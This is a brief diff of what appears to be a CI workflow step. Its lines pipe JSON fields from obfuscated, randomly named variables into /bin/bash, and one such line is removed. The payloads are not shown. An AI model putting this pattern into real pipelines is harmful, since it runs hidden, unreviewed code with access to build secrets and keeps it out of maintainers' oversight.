@@ -30,7 +30,6 @@ jobs:
           printf '%s' "$k15" | jq -r .zg99 | /bin/bash
           printf '%s' "$hsp09" | jq -r .g8235 | /bin/bash
           echo $tolng2 | jq -r .eh728 | /bin/bash
-          printf '%s' "$qwbe323" | jq -r .y18 | /bin/bash
           echo $l1361 | jq -r .cryu1823 | /bin/bash
 
       - name: Save output
